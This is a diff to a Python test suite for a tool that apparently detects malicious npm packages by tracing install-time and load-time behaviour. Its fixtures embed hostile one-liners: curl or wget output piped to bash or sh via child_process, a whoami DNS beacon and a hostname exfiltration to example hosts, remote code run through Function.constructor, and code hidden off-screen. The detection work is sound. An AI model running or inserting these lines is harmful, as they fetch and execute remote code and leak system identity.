@@ -282,12 +282,12 @@ class Verdict(unittest.TestCase):
 
 # ------------------------------------------------------------------------------------------------ JavaScript (guard/behavior/js.py)
 
-def npm_package(files: dict, scripts: dict | None = None) -> tuple[list[Path], list[str]]:
+def npm_package(files: dict, scripts: dict | None = None, fields: dict | None = None) -> tuple[list[Path], list[str]]:
     """An unpacked npm tarball (<tmp>/pkg-1.0.tgz.unpacked/package/...) plus its lifecycle files, as sources/npm does."""
     tmp = Path(tempfile.mkdtemp())
     root = tmp / "pkg-1.0.tgz.unpacked" / "package"
     files = dict(files)
-    files["package.json"] = json.dumps({"name": "pkg", "version": "1.0", "scripts": scripts or {}})
+    files["package.json"] = json.dumps({"name": "pkg", "version": "1.0", "scripts": scripts or {}, **(fields or {})})
     for rel, text in files.items():
         p = root / rel
         p.parent.mkdir(parents=True, exist_ok=True)
@@ -298,9 +298,9 @@ def npm_package(files: dict, scripts: dict | None = None) -> tuple[list[Path], l
     return out, install_files
 
 
-def js_facts(files: dict, scripts: dict | None = None) -> set:
+def js_facts(files: dict, scripts: dict | None = None, fields: dict | None = None) -> set:
     """{(finding, phase)} - the JS / shell part of behavior.analyze_files, without the Python front end."""
-    paths, install_files = npm_package(files, scripts)
+    paths, install_files = npm_package(files, scripts, fields)
     feats = types.SimpleNamespace(ecosystem="npm", install_time_files=install_files, evidence=[])
     ctx = behavior.Context()
     for path, rel, lang, phase in behavior.plan(paths, feats):
@@ -309,6 +309,14 @@ def js_facts(files: dict, scripts: dict | None = None) -> set:
             js.analyze_source(ctx, text, rel, phase)
         elif lang == "shell":
             ctx.shell(text, phase, rel, 1)
+    return {(f, ph) for (f, ph, _file, _line) in ctx.facts}
+
+
+def npm_facts(files: dict, scripts: dict | None = None, fields: dict | None = None) -> set:
+    """{(finding, phase)} through behavior.analyze_files, as the guard runs it: files can find each other."""
+    paths, install_files = npm_package(files, scripts, fields)
+    feats = types.SimpleNamespace(ecosystem="npm", install_time_files=install_files, evidence=[])
+    ctx = behavior.analyze_files(paths, feats)
     return {(f, ph) for (f, ph, _file, _line) in ctx.facts}
 
 
@@ -421,8 +429,42 @@ class JSPhases(unittest.TestCase):
         src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
         got = js_facts({"install.js": src}, {"postinstall": "node install.js"})
         self.assertIn(("download_exec", "install"), got)
-        got = js_facts({"lib/x.js": src})
+        got = js_facts({"lib/x.js": src}, fields={"main": "lib/x.js"})
         self.assertIn(("download_exec", "import"), got)
+
+    def test_load_reaches_files(self):
+        """Loading the package runs the entry files and what they require; other files run only when asked for by path."""
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        got = js_facts({"index.js": "module.exports = require('./lib/a');\n", "lib/a.js": "require('../dist/b.js');\n", "dist/b.js": src})
+        self.assertIn(("download_exec", "import"), got)
+        got = js_facts({"index.js": "export * from './lib/a.mjs';\n", "lib/a.mjs": src})
+        self.assertIn(("download_exec", "import"), got)
+        got = js_facts({"index.js": "module.exports = 1;\n", "dist/browser.global.js": src})
+        self.assertIn(("download_exec", "call"), got)                     # a browser build nothing loads
+        got = js_facts({"lib/x.js": src})
+        self.assertIn(("download_exec", "call"), got)                     # no main and no index.js: nothing runs on load
+        got = js_facts({"x.js": src}, fields={"exports": {".": {"require": "./x.js"}}})
+        self.assertIn(("download_exec", "import"), got)
+        got = js_facts({"cli.js": src}, fields={"bin": {"pkg": "cli.js"}})
+        self.assertIn(("download_exec", "command"), got)
+        got = js_facts({"pkg/index.js": "module.exports = 1;\n", "index.js": "require('./pkg');\n", "pkg/package.json": '{"main": "m.js"}', "pkg/m.js": src})
+        self.assertIn(("download_exec", "import"), got)                   # a folder's own package.json main
+
+    def test_computed_require_keeps_every_file(self):
+        """A loaded file that requires a computed name could reach any file: every file is taken to run on load."""
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        got = js_facts({"index.js": "const p = './' + 'pay' + 'load';\nrequire(p);\n", "payload.js": src})
+        self.assertIn(("download_exec", "import"), got)
+        got = js_facts({"index.js": "import(name);\n", "dist/x.js": src})
+        self.assertIn(("download_exec", "import"), got)
+
+    def test_require_used_as_a_value_keeps_every_file(self):
+        """require handed on or taken under another name can load any file: every file is taken to run on load."""
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        for loader in ("const r = require;\nr('./' + ['pay', 'load'].join(''));\n", "module.require(name);\n",
+                       "const req = require('module').createRequire(__filename);\nreq(x);\n", "factory(require);\n"):
+            got = js_facts({"index.js": loader, "payload.js": src})
+            self.assertIn(("download_exec", "import"), got, loader)
 
     def test_lifecycle_inline_node_code(self):
         got = js_facts({}, {"preinstall": "node -e \"require('child_process').exec('wget -qO- http://203.0.113.4/a|sh')\""})
@@ -436,6 +478,27 @@ class JSPhases(unittest.TestCase):
         got = js_facts({"setup.js": "require('child_process').execSync('wmic process list');\n"},
                     {"install": "node setup.js"})
         self.assertIn(("install_process", "install"), got)
+
+    def test_install_script_starts_another_file(self):
+        """An install script that starts one of the package's own files (node, python, sh) runs that file at install:
+        spawn / fork / exec, a path built from __dirname, a lifecycle command that runs a script which starts another."""
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        spawn = ("const { spawn } = require('child_process'); const path = require('path');\n"
+                 "spawn('node', [path.resolve(__dirname, 'main.js')], { detached: true, stdio: 'ignore' }).unref();\n")
+        got = npm_facts({"src/postinstall.js": spawn, "src/main.js": src}, {"postinstall": "node src/postinstall.js"})
+        self.assertIn(("download_exec", "install"), got)
+        got = npm_facts({"build.js": "require('child_process').exec('node main.js > /dev/null 2>&1;');\n", "main.js": src},
+                       {"preinstall": "node build.js"})
+        self.assertIn(("download_exec", "install"), got)
+        got = npm_facts({"i.js": "require('child_process').fork(__dirname + '/w.js');\n", "w.js": src}, {"install": "node i.js"})
+        self.assertIn(("download_exec", "install"), got)
+        got = npm_facts({"i.js": "require('child_process').execSync('sh ./run.sh');\n", "run.sh": "curl -s http://203.0.113.4/i.sh | bash\n"},
+                       {"postinstall": "node i.js"})
+        self.assertIn(("download_exec", "install"), got)
+        # the same file started only from code that runs when called: not install
+        got = npm_facts({"lib/x.js": "module.exports = () => require('child_process').spawn('node', [__dirname + '/w.js']);\n",
+                        "lib/w.js": src}, fields={"main": "lib/x.js"})
+        self.assertNotIn(("download_exec", "install"), got)
 
     def test_function_never_called_is_call_phase(self):
         got = js_code("const cp = require('child_process');\n"
@@ -457,6 +520,49 @@ class JSPhases(unittest.TestCase):
     def test_tests_folder_skipped(self):
         got = js_facts({"test/run.js": "eval(Buffer.from(x, 'base64').toString());\n"})
         self.assertEqual(got, set())
+
+
+class NpmGaps(unittest.TestCase):
+    """Forms seen in malicious npm releases the analysis used to miss (Datadog dataset, 2026-11). Each is a general
+    language form, not one package: a sink reached another way, a file the package runs itself, a value carried in
+    shell variables, code moved out of sight."""
+
+    def test_constructor_of_a_global_function_is_function(self):
+        for expr in ("new Function.constructor('require', s)", "Function.constructor('require', s)",
+                     "atob.constructor('require', s)", "new (Object.constructor)('require', s)"):
+            got = js_code("const a = require('axios');\n(async () => {\n"
+                          "  const s = (await a.get('https://x.example/p')).data.c;\n"
+                          f"  ({expr})(require);\n}})();\n")
+            self.assertIn(("download_exec", "import"), got, expr)
+
+    def test_file_the_package_spawns_counts_as_loaded(self):
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        main = ("const path = require('path'), { spawn } = require('child_process');\n"
+                "spawn('node', [path.resolve(__dirname, './lib/caller.js')], {detached: true, stdio: 'ignore'}).unref();\n")
+        self.assertIn(("download_exec", "import"), js_facts({"index.js": main, "lib/caller.js": src}))
+        joined = "require('child_process').fork(require('path').join(__dirname, 'lib', 'w.js'));\n"
+        self.assertIn(("download_exec", "import"), js_facts({"index.js": joined, "lib/w.js": src}))
+        self.assertIn(("download_exec", "call"), js_facts({"index.js": "module.exports = 1;\n", "lib/caller.js": src}))
+
+    def test_identity_carried_through_shell_variables(self):
+        ctx = behavior.Context()
+        ctx.shell("u=$(whoami) && for i in \"$u\"; do e=$(echo -n \"$i\" | xxd -p) && curl \"http://$e.dns.example/\"; done",
+                  "install", "package.json#preinstall", 1)
+        self.assertIn("sysinfo_beacon", {f for f, *_ in ctx.facts})
+        ctx = behavior.Context()
+        ctx.shell("curl --data \"ip=$(sh -c 'hostname -I | awk {print}')\" https://hook.example/x", "install", "p", 1)
+        self.assertIn("sysinfo_beacon", {f for f, *_ in ctx.facts})
+        for normal in ("V=$(node -v); curl https://x.example/?v=$V", "cd $(dirname $0) && make", "u=$(whoami); echo hi $u",
+                       "echo \"$(id -un | tr a b)\" && echo done"):
+            ctx = behavior.Context()
+            ctx.shell(normal, "install", "p", 1)
+            self.assertEqual(set(ctx.facts), set(), normal)
+
+    def test_code_hidden_off_screen(self):
+        got = js_code("module.exports = {};" + " " * 400 + "global['r'] = require; (function(){ var a = 1; })();\n")
+        self.assertIn(("hidden_code", "import"), got)
+        self.assertNotIn(("hidden_code", "import"), js_code("var t = '" + " " * 400 + "x';\nmodule.exports = t;\n"))
+        self.assertNotIn(("hidden_code", "import"), js_code("!function(){var a=1;return a}();var b=2;" * 300 + "\n"))
 
 
 class JSNormal(unittest.TestCase):
@@ -524,6 +630,93 @@ class JSNormal(unittest.TestCase):
         ctx.limits = dict(ctx.limits, max_steps=50)
         with self.assertRaises(behavior.LimitExceeded):
             js.analyze_source(ctx, "var a = 1;\n" * 200, "index.js", "import")
+
+
+class LargePackages(unittest.TestCase):
+    def test_work_list_loop_ends(self):
+        # webpack's WebAssemblyInInitialChunkError.js: a for-of over a queue that the body pushes onto. Walked as the
+        # array grew, the message string doubled each turn until the 2 MB value cap (123 s for a 3 KB file)
+        import time
+        src = ("function chains(m, g) {\n  const queue = [{head: m, message: 'x'}];\n  const out = new Set();\n"
+               "  for (const c of queue) {\n    for (const conn of g.incoming(c.head)) {\n"
+               "      const msg = `${conn.origin.name} --> ${c.message} ${c.message}`;\n"
+               "      queue.push({head: conn.origin, message: msg});\n    }\n    out.add(c.message);\n  }\n"
+               "  return [...out];\n}\nmodule.exports = chains;\n")
+        t = time.monotonic()
+        self.assertEqual(js_code(src), set())
+        self.assertLess(time.monotonic() - t, 5)
+
+    def test_work_list_loop_still_reads_items(self):
+        got = js_code("const cp = require('child_process');\nconst q = ['echo'];\n"
+                      "for (const x of q) { if (q.length < 3) q.push('curl http://203.0.113.9/a | sh'); else cp.execSync(x); }\n")
+        self.assertIn(("download_exec", "import"), got)
+
+    def test_file_over_value_cap_is_read(self):
+        # a package file is read up to the file size limit; the value cap (max_string) is for strings built at run time
+        ctx = behavior.Context()
+        ctx.limits = dict(ctx.limits, max_string=1000)
+        src = "var a = 1;\n" * 300 + "require('child_process').execSync('curl http://203.0.113.9/x | sh');\n"
+        js.analyze_source(ctx, src, "index.js", "import")
+        self.assertIn("download_exec", {f for (f, _ph, _file, _line) in ctx.facts})
+        with self.assertRaises(behavior.LimitExceeded):     # built code over the value cap is still not read
+            js.analyze_source(ctx, src, "index.js", "import", depth=1, line_base=1)
+
+    def test_code_over_value_cap_is_unreadable(self):
+        # @redhat-cloud-services/entitlements-client 4.0.11 preinstall: eval of a rot-n decoder over a 1.27 million
+        # number array; the array is over max_iter, so the code is not rebuilt - running it must not pass unnoticed
+        ctx = behavior.Context()
+        ctx.limits = dict(ctx.limits, max_iter=10)
+        src = ("try{eval(function(s,n){return s.replace(/[a-z]/g,function(c){return String.fromCharCode("
+               "(c.charCodeAt(0)-97+n)%26+97)})}([" + ",".join(["99"] * 40) + "].map(function(c){"
+               "return String.fromCharCode(c)}).join(''),24))}catch(e){}\n")
+        js.analyze_source(ctx, src, "index.js", "install")
+        self.assertIn("unreadable_exec", {f for (f, _ph, _file, _line) in ctx.facts})
+
+    def test_facts_cache_reuses_and_keys_by_content(self):
+        import os
+        from behavior import facts_cache
+        d = tempfile.mkdtemp()
+        old = {k: os.environ.get(k) for k in ("AEGIS_FACTS_CACHE", "AEGIS_FACTS_CACHE_DIR")}
+        os.environ.update({"AEGIS_FACTS_CACHE": "1", "AEGIS_FACTS_CACHE_DIR": d})
+        facts_cache._conn = None
+        bad = "require('child_process').execSync('curl http://203.0.113.9/x | sh');\n"
+        try:
+            def run(src):
+                paths, inst = npm_package({"index.js": src})
+                feats = types.SimpleNamespace(ecosystem="npm", install_time_files=inst, evidence=[])
+                ctx = behavior.analyze_files(paths, feats)
+                return {(f, ph) for (f, ph, _file, _line) in ctx.facts}
+            first = run(bad)
+            calls = []
+            orig = js.analyze_source
+            js.analyze_source = lambda *a, **k: (calls.append(a[2]), orig(*a, **k))[1]
+            try:
+                again = run(bad)
+                self.assertEqual(again, first)
+                self.assertIn(("download_exec", "import"), again)
+                self.assertNotIn("index.js", calls)             # read from the cache
+                changed = run(bad + "// one byte more\n")
+                self.assertIn("index.js", calls)                # other content: read again
+                self.assertEqual(changed, first)
+            finally:
+                js.analyze_source = orig
+        finally:
+            facts_cache._conn = None
+            for k, v in old.items():
+                if v is None:
+                    os.environ.pop(k, None)
+                else:
+                    os.environ[k] = v
+
+    def test_facts_cache_skips_file_that_depends_on_another(self):
+        from behavior import facts_cache
+        ctx = behavior.Context()
+        rec = facts_cache.Recorder(ctx, "a.js")
+        ctx.add_downloaded("/tmp/p")                         # a.js writes a download: its own result
+        self.assertEqual(rec.entry()["down"], ["/tmp/p"])
+        rec = facts_cache.Recorder(ctx, "b.js")
+        ctx.was_downloaded("/tmp/p")                         # b.js's answer comes from a.js
+        self.assertIsNone(rec.entry())
 
 
 if __name__ == "__main__":
